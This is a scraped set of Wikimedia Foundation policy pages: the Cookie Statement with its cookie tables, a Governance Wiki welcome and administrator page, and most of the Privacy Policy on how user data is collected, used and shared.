 * The use of symbols, images, categories, tags or other kinds of content that are intimidating or harmful to others outside of the context of encyclopedic, informational use. This includes imposing schemes on content intended to marginalize or ostracize.

As stated in our Privacy Policy, Wikimedia believes strongly in the values of privacy and transparency. To that end, we have created this Cookie Statement as a clear reference guide to the use of cookies on Wikimedia Sites. This Cookie Statement explains how we use cookies (and other locally stored data technologies), how we use third-party cookies, and how you can manage your cookie options. For more information on our privacy practices, please visit our Privacy Policy.

The Wikimedia Foundation, the non-profit organization that hosts the Wikimedia Sites, actively collects some types of information with a variety of commonly-used technologies. These generally include tracking pixels, JavaScript, and a variety of "locally stored data" technologies, such as cookies and local storage.


WHAT IS A COOKIE?

A "cookie" is a tiny data file that we transfer onto your computer, mobile phone, or any other device that you use to access the Wikimedia Sites, and is generally used for authentication and tracking. Every cookie expires after a certain period of time, but that period varies depending on what the cookie is used for and how your browser is configured.

Cookies are often categorized based on how long they remain active before they expire. A "session" cookie is one that generally expires when you close your web browser or mobile application. A "persistent" cookie is one that remains in your device, even after you close your browser or mobile application.  A persistent cookie expires according to the duration set by us, or when you delete it manually. You can learn more about cookies on Wikipedia.

You may remove or disable cookies through your browser settings. For more information on how to manage your cookie options, please see Section 3 of this Cookie Statement below.

For more information on this and other key terms that may be relevant, please read through our Privacy Policy Glossary.


WHAT TYPES OF COOKIES DOES WIKIMEDIA USE AND FOR WHAT PURPOSES?

Cookies are not required in order to read or edit the Wikimedia Sites. We use the information we receive from cookies and other locally stored data technologies to make your experience with the Wikimedia Sites safer and better, to gain a greater understanding of user preferences and interactions with the Wikimedia Sites, and to generally improve our services. Cookies are required in order to login and for your edits to be associated to a user account; without cookies, your edits will be anonymous and unassociated with an account.

We use cookies, JavaScript, tracking pixels, and other locally stored data technologies to accomplish different purposes. Below is a list of the categories of cookies we use and what they are used for.

Functionality:

These cookies help the Wikimedia Sites work and are essential in order to enable you to move around the Wikimedia site and use their features. These cookies are useful for remembering your username in the login field, maintaining your session and remembering previous actions, keeping you logged in (if selected), and more.

Here are a few examples:

Name Expires Category What does it do? centralauth_Token

{$wgCookiePrefix}* Token

365 days, if the user chooses 'Keep me logged in'. Otherwise omitted. Functionality Provides 'Keep me logged in' functionality. {$wgCookiePrefix}* UserID, UserName 365 days, if the user chooses 'Keep me logged in'. Otherwise 30 days. Functionality Helps identify you to the wiki, and keeps you logged in. loginnotify_prevlogins 180 days Functionality Verifies that you are logging in from a known device.

This affects the threshold for how many unsuccessful login attempts trigger a notification to the user.

centralauth_Session

{$wgCookiePrefix}* Session

When user exits browser Functionality Manage sessions. Provides functionality such as logging in to Wikimedia Projects.

Preferences:

These cookies store your preferences, so that they can be remembered the next time you use the Wikimedia Sites, for a more customized experience. These cookies are useful for recognizing and maintaining your language preference, remembering changes you have made to text size, fonts and other display preferences, so we can provide you with the look and feel that you want, and more.  

Here are a few examples:

Name Expires Category What does it do? mwclientpreferences 30 days Preferences Stores user preferences for client-side settings, such as font size, dark mode, and width (wide or standard). This cookie ensures a customized browsing experience for anonymous users. For more details, see the decision record. stopMobileRedirect 30 days Preferences Tells us not to redirect to the mobile site if you do not like that. uls-preferences Local Storage, not a cookie Preferences Allows you to set preferences for the Universal Language Selector functionality. hidewatchlistmessage- [watchlistMessageId]

● where watchlistMessageld is the Id of the message being hidden

28 days Preferences Allows a user to hide a watchlist message. userFontSize Local Storage, not a cookie Preferences Keeps track of your preferred font size on the mobile site. preferredEditor Local Storage, not a cookie Preferences Keeps track of your preferred editor on the mobile site.

Performance and Analysis:

These cookies count the number of visitors and collect information about how you use the Wikimedia Sites. This allows us to better understand your user experience on the Wikimedia Sites and helps us improve them for you and other users — for instance, by making sure users are finding what they need easily. Other examples include:

 * remembering pages visited, and actions taken on the Wikimedia sites so we can optimize the pages;
 * remembering if users get error messages from web pages;
 * storing your most recently read articles directly on your device, so they can be retrieved quickly;
 * remembering the topics searched so that we can optimize the search results we deliver to you;
 * remembering the list of articles you are following on your watchlist so that we can recommend similar articles that you may be interested in.

Here are a few examples:

Name Expires Category What does it do? centralnotice_bucket 7 days Performance and Analysis Helps us understand the effectiveness of notices provided to users through the CentralNotice extension. For more details, see Extension:CentralNotice ext.popups.core.previewCount Local Storage, not a cookie Performance and Analysis Helps us understand the effectiveness of Hovercards. WMF-Last-Access 30 days Performance and Analysis Helps us calculate Unique devices accessing our site. See: diff.wikimedia.org/2016/03/30/unique-devices-dataset/

Third-Party:

We will never use third-party cookies on our wikis unless we get your permission to do so. These cookies would allow us to render services provided by third parties, such as "like" and "share" buttons. When a third party provides these kinds of services, they may require the use of a cookie in order to provide their services.

If you ever come across a third-party cookie transferred to your device during your access of the Wikimedia wiki sites, where you did not take any action to authorize the use and/or transfer of that cookie  (such as one that may have been mistakenly placed by another user or administrator), please report that cookie to us at privacywikimedia.org.

A note about Wikimedia Foundation non-wiki sites:

Some non-wiki Wikimedia Foundation sites are hosted by a third-party service provider.

Sites hosted by WordPress VIP may have the WordPress Stats module enabled. Stats is a service that allows us to understand how many visitors we get to our WordPress-hosted non-wiki sites, their location by country, and which pages, posts and links are the most popular. Only the Wikimedia Foundation and the service provider, Automattic/WordPress, have access to the raw Stats data, which is retained for a maximum of 30 days. For more information about Stats, see WordPress' support page on the module.

Sites hosted by Civilized Discourse Construction Kit, Inc., known as Discourse forums, use cookies for functionality purposes and to store preferences. Only the Wikimedia Foundation and the service provider have access to the raw data. For more information about the cookies and their retention periods, see Discourse's information about cookies. Please note that the Wikimedia Foundation has not configured its Discourse forums to use Google Analytics, serve advertisements, or process donations; Discourse cookies related to those purposes are not used in our Sites.


WHAT ARE MY COOKIE OPTIONS?

While this is not a comprehensive list, below are some of the things that you can do to limit use of cookies and other locally stored data technologies on your device. While cookies and other locally stored data technologies may not be necessary to use our sites, some features may not function properly if you disable them.

You can:

 * remove or disable specific locally stored data on your browser's settings (you can reset your web browser to refuse all cookies or to indicate when a cookie is being sent);
 * use a browser that can block third-party cookies; or
 * install a plug-in to block locally stored data, if one is available.

Turning off the browser's cookies will prevent tracking pixels from tracking your specific activity. A tracking pixel may still record an anonymous visit from your IP address, but unique information will not be recorded. If you do not want to receive tracking pixels, you will need to disable HTML images in your browser-based email client, and that may affect your ability to view images in other emails that you receive.


WHERE CAN I FIND MORE INFORMATION?

Please read through our Privacy Policy for more information. If you have any further questions, contact privacywikimedia.org.

Thanks!

Welcome to the Wikimedia Foundation Governance Wiki, where the Wikimedia Foundation and its related entities make available to the public multiple types of governance and policy related materials.


WELCOME

Thank you for being here!

This wiki does not exactly follow the same rules as the other Wikimedia projects, since it is not open to all for editing, and in case of disagreement, the mechanism for making decisions will be handled by the Wikimedia Foundation staff or Board of Trustees.

It is managed by Wikimedia Foundation staff and contractors, primarily within the Communications and Legal departments.


SCOPE

Main page: Wikimedia:Scope

This wiki makes publicly available multiple governance and policy related materials from the Wikimedia Foundation, such as:

 * Wikimedia Foundation Board of Trustees documentation, such as:
   * Minutes
   * Resolutions
 * Official Wikimedia Foundation documentation, such as:
   * Institutional knowledge documentation
   * Legal documentation
   * Organization policies and guidelines
   * Security documentation
 * Official Wikimedia Endowment documentation, such as:
   * Charters
   * Policies
 * Official Wikimedia Enterprise documentation, such as:
   * General cost sharing and operating agreements
   * Specific license agreements

It also stores the archives of the no longer actively used or maintained Foundation Wiki content.


ACCOUNTS ON THIS WIKI

Register account
Main page: Wikimedia:Accounts policy

In October 2021, all registered accounts on other Wikimedia project wikis got edit access to the talk and user pages of this wiki and became able to support translation of this wiki's content into languages other than English.

Editing on regular content pages is restricted to approved editor accounts.


ADMINISTRATORS ON THIS WIKI

Administrators previously included a variety of Foundation staff and non-Foundation volunteers. From May 2013, only Foundation board and staff members may be administrators on this site (though temporary adminship for non-Foundation personnel may be possible in certain cases). Stewards and global sysops also have administrator rights on this wiki.


CORE ADMINISTRATORS TEAM

As of May 6, 2024, the core team of administrators primarily responsible for operations and maintenance of Wikimedia Foundation Governance Wiki are:

 * User:GVarnum-WMF - Project lead
 * User:Martin Urbanec (WMF)
 * User:MLee (WMF)
 * User:MMoss (WMF)
 * User:Quiddity (WMF)
 * User:RAdimer-WMF

CONTACTING THE CORE ADMINISTRATORS TEAM

Anyone with a registered account can post on this wiki's Babel noticeboard, which is regularly monitored by the core administrators team. You can also use the {{Edit request}} template to make a request for an edit on a specific page. If needed, you can contact the wiki's coordinating Wikimedia Foundation department, Communications, via email: talktocommswikimediaorg

Wikimedia Foundation staff can contact the core administrators team via the internal #governance-wiki Slack channel.

This policy is approved by the Wikimedia Foundation Board of Trustees.

Wikimedia Foundation Privacy Policy

This is a summary of the Privacy Policy. To read the full terms, scroll down or click here.
Disclaimer: This summary is not a part of the Privacy Policy and is not a legal document. It is simply a handy reference for understanding the full Privacy Policy. Think of it as the user-friendly interface to our Privacy Policy.


Because we believe that you should not have to provide personal information to participate in the free knowledge movement, you may:

 * Read, edit, or use any Wikimedia Site without registering an account.
 * Register for an account without providing an email address or real name.

Because we want to understand how Wikimedia Sites are used so we can make them better for you, we collect some information when you:

 * Make public contributions.
 * Register an account or update your user page.
 * Use the Wikimedia Sites.
 * Send us emails or participate in a survey or give feedback.

We are committed to:

 * Describing how your information may be used or shared in this Privacy Policy.
 * Using reasonable measures to keep your information secure.
 * Never selling your information or sharing it with third parties for marketing purposes.
 * Only sharing your information in limited circumstances, such as to improve the Wikimedia Sites, to comply with the law, or to protect you and others.
 * Retaining your data for the shortest possible time that is consistent with maintaining, understanding, and improving the Wikimedia Sites, and our obligations under applicable law.

Be aware:

 * Any content you add or any change that you make to a Wikimedia Site will be publicly and permanently available.
 * If you add content or make a change to a Wikimedia Site without logging in, that content or change will be publicly and permanently attributed to the IP address used at the time rather than a username.
 * Our community of volunteer editors and contributors is a self-policing body. Certain administrators of the Wikimedia Sites, who are chosen by the community, use tools that grant them limited access to nonpublic information about recent contributions so they may protect the Wikimedia Sites and enforce policies.
 * This Privacy Policy does not apply to all sites and services run by the Wikimedia Foundation, such as sites or services that have their own privacy policy (like the Wikimedia Shop) or sites or services run by third parties (like third-party developer projects on Wikimedia Cloud Services).
 * As part of our commitment to education and research around the world, we occasionally release public information and aggregated or non-personal information to the general public through data dumps and data sets.
 * For the protection of the Wikimedia Foundation and other users, if you do not agree with this Privacy Policy, you may not use the Wikimedia Sites.

INTRODUCTION


WELCOME!



The Wikimedia Foundation is the nonprofit organization that operates collaborative, free knowledge websites, like Wikipedia, Wikimedia Commons, and Wiktionary.

This Policy explains how we collect, use, and share your Personal Information.

 * We collect very little Personal Information about you.
 * We do not rent or sell your Personal Information to third parties.

By using Wikimedia Sites, you consent to this Policy.

The Wikimedia movement is founded on a simple, but powerful principle: we can do more together than any of us can do alone. We cannot work collectively without gathering, sharing, and analyzing information about our users as we seek new ways to make the Wikimedia Sites more usable, safer, and more beneficial.

We believe that information-gathering and use should go hand-in-hand with transparency. This Privacy Policy explains how the Wikimedia Foundation, the non-profit organization that hosts the Wikimedia Sites, like Wikipedia, collects, uses, and shares information we receive from you through your use of the Wikimedia Sites. It is essential to understand that, by using any of the Wikimedia Sites, you consent to the collection, transfer, processing, storage, disclosure, and use of your information as described in this Privacy Policy. That means that reading this Policy carefully is important.

We believe that you should not have to provide nonpublic Personal Information to participate in the free knowledge movement. You do not have to provide things like your real name, address, or date of birth to sign up for a standard account or contribute content to the Wikimedia Sites.

We do not sell or rent your Personal Information, nor do we give it to others to sell you anything. We use it to figure out how to make the Wikimedia Sites more engaging and accessible, to see which ideas work, and to make learning and contributing more fun. Put simply: we use this information to make the Wikimedia Sites better for you.

After all, it is people like you, the champions of free knowledge, who make it possible for the Wikimedia Sites to not only exist, but also grow and thrive.



DEFINITIONS

Back to top


We recognize that only a minority of you are familiar with technical terms like "tracking pixels" and "cookies" used in the Privacy Policy.

Whether you are brand new to privacy terminology or you are an expert who just wants a refresher, you might find our Glossary of Key Terms helpful.

Because everyone (not just lawyers) should be able to easily understand how and why their information is collected and used, we use common language instead of more formal terms throughout this Policy. To help ensure your understanding of some particular key terms, here is a table of translations:




When we say... ...we mean: "the Wikimedia Foundation" / "the Foundation" / "we" / "us" / "our" The Wikimedia Foundation, Inc., the non-profit organization that operates the Wikimedia Sites. "Wikimedia Sites" / "our services" Wikimedia websites and services (regardless of language), including our main projects, such as Wikipedia and Wikimedia Commons, as well as mobile applications, Application Programming Interfaces (APIs), emails, and notifications; excluding, however, sites and services listed in the "What This Privacy Policy Does Not Cover" section below. "you" / "your" / "me" You, regardless of whether you are an individual, group, or organization, and regardless of whether you are using the Wikimedia Sites or our services on behalf of yourself or someone else. "this Policy" / "this Privacy Policy" This document, entitled the "Wikimedia Foundation Privacy Policy". "contributions" Content you add or changes you make to any Wikimedia Sites. "Personal information" Information you provide us or information we collect that could be used to personally identify you. To be clear, while we do not necessarily collect all of the following types of information, we consider at least the following to be "personal information" if it is otherwise nonpublic and can be used to identify you: (a) your real name, address, phone number, email address, password, identification number on government-issued ID, IP address, user-agent information, payment account number; (b) when associated with one of the items in subsection (a), any sensitive data such as date of birth, gender, sexual orientation, racial or ethnic origins, marital or familial status, medical conditions or disabilities, political affiliation, and religion. "third party" / "third parties" Individuals, entities, websites, services, products, and applications that are not controlled, managed, or operated by the Wikimedia Foundation. This includes other Wikimedia users and independent organizations or groups who help promote the Wikimedia movement such as Wikimedia chapters, thematic organizations, and user groups as well as volunteers, employees, directors, officers, grant recipients, and contractors of those organizations or groups.




WHAT THIS PRIVACY POLICY DOES AND DOES NOT COVER

Except as explained below, this Privacy Policy applies to our collection and handling of information about you that we receive as a result of your use of any of the Wikimedia Sites. This Policy also applies to information that we receive from our partners or other third parties. To understand more about what this Privacy Policy covers, please see below.

Examples of What This Privacy Policy Covers

For the sake of clarity, this Privacy Policy covers, regardless of language:

 * All of our major sites (found at list of major projects), such as Wikipedia, including user pages, discussion pages, and noticeboards.
 * Our blogs and APIs (unless we have provided a separate policy for those services).
 * Official Wikimedia Foundation mobile applications.
 * Emails, SMS, and notifications from us or sent to us from you.

This Privacy Policy, however, does not cover some situations where we may gather or process information. For example, some uses may be covered by separate privacy policies (like those of the Wikimedia Shop) or sites or services run by third parties (such as third-party developer projects on Wikimedia Cloud Services). To understand more about what this Privacy Policy does not cover, please see below.



More on what the Wikimedia Foundation Privacy Policy does not cover

This section is part of the Privacy Policy and is meant to explain in detail which situations are not covered by our Privacy Policy.

Wikimedia Sites and Tools with alternative policies Some Wikimedia Foundation websites or tools have alternative privacy policies or provisions that differ from this Privacy Policy. These websites include:
 * Wikipedia Store (covered by the shop's policy);
 * donate.wikimedia.org, including the donation process, such as clicking on a donation banner (covered by the Donor Privacy Policy); and
 * The Wikipedia Reading Lists Browser Extension, which is governed by a separate Privacy Policy. This separate policy will also be made available where the Extension can be downloaded.

If a Wikimedia Foundation website is governed by an alternative privacy policy, it will link to such policy. When a Wikimedia Foundation tool is governed by an alternative privacy policy, the page where the tool may be downloaded or enabled will include a link to that policy. Community members The Wikimedia Sites are collaborative labors of love that are constantly maintained and updated by a global community of volunteers. This global community of volunteers may sometimes have access to personal Information in order to ensure the functioning of the Wikimedia Sites.
 * Administrative volunteers, such as CheckUsers or Stewards. These are volunteers who enforce Wikimedia Site policies and ensure the safety of the Wikimedia Sites. When these administrators access Personal Information that is nonpublic, they are required to comply with our Access to nonpublic personal data policy, as well as other, tool-specific policies.
 * Tool providers. We support platforms for third-party developers to experiment and develop new tools and sites, such as wmflabs.org. When you use one of the tools developed by these volunteers, you may transfer information to them. When these volunteers access nonpublic information or Personal Information, they are required to comply with the terms governing the particular platform the tool is available on.
 * Other users. We provide several tools that allow users to communicate with each other. The communications may be covered by this Policy while they pass through our systems, but the users who receive these communications, and what they do with the communications once they receive them, are not covered by this Policy. Examples include:
   * posting to Foundation-hosted email lists;
   * requesting support from volunteers through our online ticketing system (email sent to infowikimedia.org goes to this system);
   * emailing other users through the Wikimedia Sites (for example, by using the "Email this user" feature); and
   * chatting on IRC (such as on the #wikipedia channel).

Third parties This Privacy Policy only covers the way the Wikimedia Foundation collects, uses and discloses Personal Information and does not address the practices of third parties. For example, this Privacy Policy does not address the practices of:
 * Websites run by other organizations, like websites linked to from the "References" sections of Wikipedia, or run by Wikimedia chapters or other movement organizations. These organizations may receive information from you if you visit their websites after using one of the Wikimedia Sites. They are governed by their own privacy policies.
 * Mobile applications provided by other organizations or individuals. These organizations or individuals may receive information from you if you use those applications to access the Wikimedia Sites or Wikimedia Site content. They are governed by their own privacy policies.

Sometimes, volunteers may place a data-collecting tool, such as a script, gadget, tracking pixel, or share button, on a Wikimedia Site without our knowledge. This Policy does not cover how third parties handle the information they receive as a result of such a tool. If you come across such a third-party tool, and you believe it violates this Policy, you can remove the tool yourself, or report it to privacywikimedia.org so we can investigate.

Where community policies govern information, such as the CheckUser policy, the relevant community may add to the rules and obligations set out in this Policy. However, they are not permitted to create new exceptions or otherwise reduce the protections offered by this Policy.

COLLECTION & USE OF INFO


TYPES OF INFORMATION WE RECEIVE FROM YOU & HOW WE GET IT



YOUR PUBLIC CONTRIBUTIONS



Whatever you post on Wikimedia Sites can be seen and used by everyone.

When you make a contribution to any Wikimedia Site, including on user or discussion pages, you are creating a permanent, public record of every piece of content added, removed, or altered by you. The page history will show when your contribution or deletion was made, as well as your username (if you are signed in) or your IP address (if you are not signed in). We may use your public contributions, either aggregated with the public contributions of others or individually, to create new features or data-related products for you or to learn more about how the Wikimedia Sites are used, as further explained below in the "How We Use Information We Receive From You" section of this Privacy Policy.

Publicly Visible Information

Unless this Policy says otherwise, you should assume that information that you actively contribute to the Wikimedia Sites, including Personal Information, is publicly visible and can be found by search engines. Like most things on the Internet, anything you share may be copied and redistributed throughout the Internet by other people. Please do not contribute any information that you are uncomfortable making permanently public, like revealing your real name or location in your contributions.

You should be aware that specific data made public by you or aggregated data that is made public by us can be used by anyone for analysis and to infer further information, such as which country a user is from, political affiliation and gender.

Back to top


ACCOUNT INFORMATION & REGISTRATION



You do not need to create an account to use any Wikimedia Site.

If you do create an account, you do not need to give us your name or email address (although you can if you choose to, such as for the "Email this user" feature for example).

If you do not create an account, your contributions will be publicly attributed to your IP address.

Want to create an account? Great! Do not want to create an account? No problem!

You are not required to create an account to read or contribute to a Wikimedia Site, except under rare circumstances. However, if you contribute without signing in, your contribution will be publicly attributed to the IP address associated with your device.

If you want to create a standard account, in most cases we require only a username and a password. However, if you choose not to provide an email address, we cannot help you recover your password.

More on Usernames

Your username will be publicly visible, so please be careful about revealing your real name or other Personal Information in your username. Your password is only used to verify that the account is yours. Your IP address is also automatically submitted to us, and we record it temporarily. This is to protect Wikimedia users and project content; in the event of abuse, IP addresses may be associated with usernames as part of an investigation. No other Personal Information is required: no name, no email address, no date of birth, and no credit card information.

Once created, user accounts cannot be removed entirely (although you can usually hide the information on your user page if you choose to). This is because your public contributions must be associated with their author (you!). In some circumstances, the Wikimedia communities can assist users with removing additional information related to their account from the projects.

To gain a better understanding of the demographics of our users, to localize our services and to learn how we can improve our services, we may ask you for more demographic information, such as gender or age, about yourself. We will tell you if such information is intended to be public or private, so that you can make an informed decision about whether you want to provide us with that information. Providing such information is always completely optional. If you do not want to, you do not have to—it is as simple as that.

LOCATION INFORMATION



GPS & OTHER LOCATION TECHNOLOGIES



Some features we offer work better if we know what area you are in.

If you consent, we can use GPS (and other technologies commonly used to determine location) to show you more relevant content. We keep information obtained by these technologies confidential, except as provided in this Policy. You can learn more by checking out the list of examples of how we use these technologies in our FAQ.

METADATA



Sometimes, we automatically receive location data from your device. For example, if you want to upload a photo on the Wikimedia Commons mobile app, we may receive metadata, such as the place and time you took the photo, automatically from your device. Please be aware that, unlike location information collected using GPS signals described above, the default setting on your mobile device typically includes the metadata in your photo or video upload to the Wikimedia Sites. If you do not want metadata sent to us and made public at the time of your upload, please change your settings on your device.

Back to top


IP ADDRESSES



Finally, when you visit any Wikimedia Site, we automatically receive the IP address of the device (or your proxy server) you are using to access the Internet, which could be used to infer your geographical location.

INFORMATION RELATED TO YOUR USE OF THE WIKIMEDIA SITES



We use certain technologies to collect information about how you use Wikimedia Sites.

Like other websites, we receive some information about you automatically when you visit the Wikimedia Sites.

We also use a variety of commonly-used technologies, like cookies, to collect information regarding how you use the Wikimedia Sites, make our services safer and easier to use, and to help create a better and more customizable experience for you.

We want to make the Wikimedia Sites better for you by learning more about how you use them. Examples of this might include how often you visit the Wikimedia Sites, what you like, what you find helpful, how you get to the Wikimedia Sites, and whether you would use a helpful feature more if we explained it differently. We also want this Policy and our practices to reflect our community's values. For this reason, we keep information related to your use of the Wikimedia Sites confidential, except as provided in this Policy.

INFORMATION WE RECEIVE AUTOMATICALLY



Because of how browsers work, we receive some information automatically when you visit the Wikimedia Sites. This includes when you use an online tool on a third-party site that loads information coming from the Wikimedia Sites. This information includes the type of device you are using (possibly including unique device identification numbers, for some beta versions of our mobile applications), the type and version of your browser, your browser's language preference, the type and version of your device's operating system, in some cases the name of your internet service provider or mobile carrier, the website that referred you to the Wikimedia Sites, which pages you request and visit, and the date and time of each request you make to the Wikimedia Sites.

Put simply, we use this information to enhance your experience with Wikimedia Sites. For example, we use this information to administer the sites, provide greater security, and fight vandalism; optimize mobile applications, customize content and set language preferences, test features to see what works, and improve performance; understand how users interact with the Wikimedia Sites, track and study use of various features, gain understanding about the demographics of the different Wikimedia Sites, and analyze trends.

INFORMATION WE COLLECT



We use a variety of commonly-used technologies, like cookies, to understand how you use the Wikimedia Sites, make our services safer and easier to use, and to help create a better and more customizable experience for you.

We actively collect some types of information with a variety of commonly-used technologies. These generally include tracking pixels, JavaScript, and a variety of "locally stored data" technologies, such as cookies and local storage. These types of technologies may also be used in online tools on a third-party site that loads information from the Wikimedia Sites. We realize that some of these technologies do not have the best reputation in town and can be used for less-than-noble purposes. So we want to be as clear as we can about why we use these methods and the type of information we collect with them.

Depending on which technology we use, locally stored data may include text, Personal Information (like your IP address), and information about your use of the Wikimedia Sites (like your username or the time of your visit). See below for more information.

We use this information to make your experience with the Wikimedia Sites safer and better, to gain a greater understanding of user preferences and their interaction with the Wikimedia Sites, and to generally improve our services. We will never use third-party cookies, unless we get your permission to do so. If you ever come across a third-party data collection tool that has not been authorized by you (such as one that may have been mistakenly placed by another user or administrator), please report it to us at privacy@wikimedia.org.

More on Locally Stored Data

Locally stored data, JavaScript, and tracking pixels help us do things like:

 * Provide you with a customizable experience, such as using cookies to know your language preference, to remember the user preferences you set so we can provide you with the customized look and feel that you want, and to tell you about interesting Wikimedia issues and events in your area.
 * Deliver more relevant content to you faster. For example, we use local storage to store your most recently read articles directly on your device, so they can be retrieved quickly. Also, we use cookies to learn about the topics searched so that we can optimize the search results we deliver to you.
 * Understand how you use the Wikimedia Sites, so that we know what works and what is useful. For example, we might use cookies to learn about the list of articles you are following on your watchlist so that we can recommend similar articles that you may be interested in.
 * Understand how you use the Wikimedia Sites across different devices, so that we can make our varied Wikimedia Sites more efficient and effective for you.
 * Make the Wikimedia Sites more convenient to use, such as by using cookies to maintain your session when you log in or to remember your username in the login field.

Want to know even more? You can read more about some of the specific cookies we use, when they expire, and what we use them for in our FAQ.

We believe this data collection helps improve your user experience, but you may remove or disable some or all locally stored data through your browser settings, depending on your browser. You can learn more about some options you have in our FAQ. While locally stored data may not be necessary to use our sites, some features will not function properly if you disable locally stored data.

While the examples above concerning information about you collected through the use of data collection tools are kept confidential in accordance with this Policy, please note that some information about the actions taken by your username is made publicly available through public logs alongside actions taken by other users. For example, a public log may include the date your account was created on a Wikimedia Site along with the dates that other accounts were created on a Wikimedia Site.

OTHER



LOCATION INFORMATION



GPS & OTHER LOCATION TECHNOLOGIES



As stated above, we can use commonly-used location technologies to show you more relevant content. For example, our mobile apps can identify articles from the Wikimedia sites about points of interest near your location. As a reminder, you can consent to and/or deactivate our access to these location technologies at any time for example through the native OS functionalities on your mobile device, and still use the Wikimedia Sites.

Back to top


METADATA



As stated above, we may automatically receive location data from your device. For example, if you upload a photo using the Wikimedia Commons mobile app, please be aware that the default setting on your mobile device typically results in the metadata associated with your photo being included in the upload. As a reminder, if you do not want metadata sent to us and made public at the time of your upload, please change your settings on your device.

Back to top


IP ADDRESSES



When you visit any Wikimedia Site, we automatically receive the IP address of the device (or your proxy server) you are using to access the Internet, which could be used to infer your geographical location. We keep IP addresses confidential, except as provided in this Policy. If you are visiting Wikimedia Sites with your mobile device, we may use your IP address to provide anonymized or aggregated information to service providers regarding the volume of usage in certain areas.

We use this location information to make your experience with the Wikimedia Sites safer and better, to gain a greater understanding of user preferences and their interaction with the Wikimedia Sites, and to generally improve our services. For example, we use this information to provide greater security, optimize mobile applications, and learn how to expand and better support Wikimedia communities. We also use Personal Information in the manner described in the sections of this Policy titled "For Legal Reasons" and "To Protect You, Ourselves & Others."

Back to top





SHARING


WHEN MAY WE SHARE YOUR INFORMATION?



We use and share your Personal Information when you give us specific permission to do so, for legal reasons, and in the other circumstances described below.

WITH YOUR PERMISSION



We share your Personal Information for a particular purpose, if you agree. For example, if you receive a scholarship and we ask permission to share your Personal Information with a local chapter. You can find more information in the list of examples in our FAQ.

Back to top


FOR LEGAL REASONS



We will disclose your Personal Information to public authorities or other persons in response to an official legal process only if we believe it to be legally valid. See also our Requests for user information procedures and guidelines. We will notify you of such requests when possible. We do so to further our legitimate interest and/or to comply with our legal obligations.

We will access, use, preserve, and/or disclose your Personal Information if we reasonably believe it necessary to satisfy a valid and legally enforceable warrant, subpoena, court order, law or regulation, or other judicial or administrative order. However, if we believe that a particular request for disclosure of a user's information is legally invalid or an abuse of the legal system and the affected user does not intend to oppose the disclosure themselves, we will try our best to fight it. We are committed to notifying you via email at least ten (10) calendar days, when possible, before we disclose your Personal Information in response to a legal demand. However, we may only provide notice if we are not legally restrained from contacting you, there is no credible threat to life or limb that is created or increased by disclosing the request, and you have provided us with an email address.

Nothing in this Privacy Policy is intended to limit any legal objections or defenses you may have to a third-party's request (whether it be civil, criminal, or governmental) to disclose your Personal Information. We recommend seeking the advice of legal counsel immediately if such a request is made involving you.

For more information, see our Subpoena FAQ.

Back to top


IF THE ORGANIZATION IS TRANSFERRED (REALLY UNLIKELY!)



In the unlikely event that the ownership of the Foundation changes, we will provide you 30 days' notice before any Personal Information is transferred to the new owners or becomes subject to a different privacy policy.

In the extremely unlikely event that ownership of all or substantially all of the Foundation changes, or we go through a reorganization (such as a merger, consolidation, or acquisition), consistent with our legitimate interest, we will continue to keep your Personal Information confidential, except as provided in this Policy, and provide notice to you via the Wikimedia Sites and a notification on WikimediaAnnounce-L or similar mailing list at least thirty (30) calendar days before any Personal Information is transferred or becomes subject to a different privacy policy.

Back to top


TO PROTECT YOU, OURSELVES & OTHERS



We, or users with certain administrative rights, use and disclose Personal Information that is reasonably necessary to:

 * enforce or investigate potential violations of the Wikimedia Foundation or community-based policies;
 * protect our organization, infrastructure, employees, contractors, or the public; or
 * prevent imminent or serious bodily harm or death to a person.

We do so to manage our relationship with you, to further our legitimate interest, and/or to comply with our legal obligations.

We, or particular users with certain administrative rights as described below, need to use and share your Personal Information if it is reasonably believed to be necessary to enforce or investigate potential violations of our Terms of Use, this Privacy Policy, or any Wikimedia Foundation or user community-based policies. We may also need to access and share Personal Information to investigate and defend ourselves against legal threats or actions.

Wikimedia Sites are collaborative, with users writing most of the policies and selecting from amongst themselves people to hold certain administrative rights. These rights may include access to limited amounts of otherwise nonpublic information about recent contributions and activity by other users. They use this access to help protect against vandalism and abuse, fight harassment of other users, and generally try to minimize disruptive behavior on the Wikimedia Sites. These various user-selected administrative groups have their own privacy and confidentiality guidelines, but all such groups are supposed to agree to follow our Access to nonpublic personal data policy. These user-selected administrative groups are accountable to other users through checks and balances: users are selected through a community-driven process and overseen by their peers through a logged history of their actions. However, the legal names of these users are not known to the Wikimedia Foundation.

We hope that this never comes up, but we may disclose your Personal Information if we believe that it is reasonably necessary to prevent imminent and serious bodily harm or death to a person, or to protect our organization, employees, contractors, users, or the public. We may also disclose your Personal Information if we reasonably believe it necessary to detect, prevent, or otherwise assess and address potential spam, malware, fraud, abuse, unlawful activity, and security or technical concerns. (Check out the list of examples in our FAQ for more information.)

Back to top


TO OUR SERVICE PROVIDERS



We disclose Personal Information to our third-party service providers or contractors to help run or improve the Wikimedia Sites and provide services in support of our mission.

We use third-party service providers or contractors to help run or improve the Wikimedia Sites for you and other users. We give access to your Personal Information to these providers or contractors as needed to perform their services for us or to use their tools and services. We put requirements, such as confidentiality agreements, in place to help ensure that these service providers treat your Personal Information consistently with, and no less protective of your privacy than, the principles of this Policy. For further information, please see our FAQ.

If you are visiting Wikimedia Sites with your mobile device, we use your IP address to provide anonymized or aggregated information to service providers regarding the volume of usage in certain areas.

Some of our service providers ask us to post links to their privacy policies; a list of these service providers and links to their policies can be found on this page.

Back to top


TO UNDERSTAND & EXPERIMENT


 * We give volunteer developers and researchers access to systems that contain your Personal Information to allow them to protect, develop, and contribute to the Wikimedia Sites.
 * We also share non-Personal Information or aggregated information with third parties interested in studying the Wikimedia Sites.
 * When we share Personal Information with third parties for these purposes, we put reasonable technical and contractual protections in place to protect your Personal Information consistent with this Policy and our legitimate interest.

The open-source software that powers the Wikimedia Sites depends on the contributions of volunteer software developers, who spend time writing and testing code to help it improve and evolve with our users' needs. To facilitate their work, we give some developers limited access to systems that contain your Personal Information, but only as reasonably necessary for them to develop and contribute to the Wikimedia Sites.

Similarly, we share non-Personal Information or aggregated information with researchers, scholars, academics, and other interested third parties who wish to study the Wikimedia Sites. Sharing this Personal Information helps them understand usage, viewing, and demographics statistics and patterns. They then can share their findings with us and our users so that we can all better understand and improve the Wikimedia Sites.

